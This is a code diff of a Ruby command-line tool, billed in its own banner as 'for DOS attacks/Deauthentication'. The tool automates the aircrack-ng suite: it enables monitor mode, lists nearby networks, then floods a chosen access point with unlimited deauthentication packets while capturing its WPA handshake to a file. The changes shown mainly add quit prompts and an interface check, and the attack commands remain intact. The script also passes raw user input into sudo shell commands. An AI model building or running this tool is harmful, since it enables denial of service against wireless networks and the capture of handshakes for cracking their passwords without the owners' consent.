An automated wifi deauthenticater using ruby

+++ deauther.rb
@@ -10,6 +10,7 @@ def banner
     cmd = `figlet -f #{font} "#{ruby}"`.colorize(:red)
     puts cmd
     puts "[[=RB-Deauther V-1.0]=]".colorize(:yellow)
+    puts "[[=Created by Genius]=]".colorize(:yellow)
     puts "[[=RB-Deauther for DOS attacks/Deauthentication]=]".colorize(:yellow)
     puts "[[=https://github.com/Salvatore-droid]=]".colorize(:yellow)
     puts asterisk
@@ -22,6 +23,11 @@ end
 def start(interface)
     print "Enter 'start' to begin attack process: ".colorize(:cyan)
     start = gets.chomp
+    if start == "quit"
+        puts "exiting system..!!".colorize(:red)
+        sleep 1
+        exit 0
+    end
     check = `sudo airmon-ng check kill 2>&1`
     wlan_mon = `sudo airmon-ng start #{interface} 2>&1`
     if start == "start"
@@ -36,6 +42,8 @@ def start(interface)
         end
     else 
         puts "Error: Invalid input!!".colorize(:red)
+        sleep 1
+        exit 0
     end
 end
 
@@ -54,6 +62,11 @@ def dump(intermon, interface)
     puts "\nNOTE: Enter (ctrl+c) keys to stop listing the networks".colorize(:yellow)
     print "Enter 'dump' to list available networks: ".colorize(:cyan)
     list = gets.chomp
+    if list == "quit"
+        puts "exiting system..!!".colorize(:red)
+        sleep 1
+        exit 0
+    end
     if list == "dump"
         interfaces = `sudo airmon-ng 2>&1`
         if interfaces.include?("#{interface}")||interfaces.include?("#{intermon}")
@@ -71,35 +84,86 @@ def dump(intermon, interface)
         end
     else
         puts "Invalid input!".colorize(:red)
+        sleep 1
+        exit 0
     end
     
 end
 
+def install_ruby
+    `sudo apt-get install ruby-full`
+end
 
+def check_ruby
+    `ruby -v`
+end
+
+def start_up
+    check = check_ruby
+    if check
+        puts "Initializing System boot up..!!".colorize(:green)
+        sleep 3
+    else
+        puts "Installing Ruby..!!".colorize(:magenta)
+        install_ruby
+    end
+end
 
 def main
     banner
+    puts "Enter quit to exit\n".colorize(:blue)
+    sleep 2
+    start_up
+    interfaces = `sudo airmon-ng`
     system("sudo airmon-ng")
     print "Enter interface name to proceed: ".colorize(:cyan)
     interface = gets.chomp
     intermon = "#{interface}mon"
-    start(interface)
-    dump(intermon, interface)
-    print "Enter target BSSID to attack: ".colorize(:cyan)
-    target = gets.chomp
-    puts "Setting up attack preparations for target BSSID #{target}..!!".colorize(:yellow)
-    sleep(3)
-    print "\nNOTE: Enter (ctrl+c) to terminate the process\n".colorize(:yellow)
-    print "Set file name for storage of handshake captured: ".colorize(:cyan)
-    file_name = gets.chomp
-    print "Enter Channel(CH) number of Target: ".colorize(:cyan)
-    channel = gets.chomp    
-    command1 = "sudo airodump-ng -w #{file_name} -c #{channel} --bssid #{target} #{intermon}"
-    command2 = "sudo aireplay-ng --deauth 0 -a #{target} #{intermon}"
-    airodump_thread = deauthentication(command1)
-    aireplay_thread = deauthentication(command2)
-    airodump_thread.join
-    aireplay_thread.join
+    if interfaces.include?("#{interface}")||interfaces.include?("#{intermon}")
+        if interface == "quit"
+            puts "exiting system..!!".colorize(:red)
+            sleep 1
+            exit 0
+        end
+        start(interface)
+        dump(intermon, interface)
+        print "Enter target BSSID to attack: ".colorize(:cyan)
+        target = gets.chomp
+        if target == "quit"
+            puts "exiting system..!!".colorize(:red)
+            sleep 1
+            exit 0
+        end
+        puts "Setting up attack preparations for target BSSID #{target}..!!".colorize(:yellow)
+        sleep(3)
+        print "Set file name for storage of handshake captured: ".colorize(:cyan)
+        file_name = gets.chomp
+        if file_name == "quit"
+            puts "exiting system..!!".colorize(:red)
+            sleep 1
+            exit 0
+        end
+        print "Enter Channel(CH) number of Target: ".colorize(:cyan)
+        channel = gets.chomp    
+        if channel == "quit"
+            puts "exiting system..!!".colorize(:red)
+            sleep 1
+            exit 0
+        end
+        print "\nNOTE: Enter (ctrl+c) to terminate the process\n".colorize(:yellow)
+        sleep 2
+        command1 = "sudo airodump-ng -w #{file_name} -c #{channel} --bssid #{target} #{intermon}"
+        command2 = "sudo aireplay-ng --deauth 0 -a #{target} #{intermon}"
+        airodump_thread = deauthentication(command1)
+        aireplay_thread = deauthentication(command2)
+        airodump_thread.join
+        aireplay_thread.join
+    else
+        puts "Wrong interface..!!".colorize(:red)
+        sleep 2
+        puts "exiting system..!!".colorize(:red)
+        sleep 1
+    end
 end
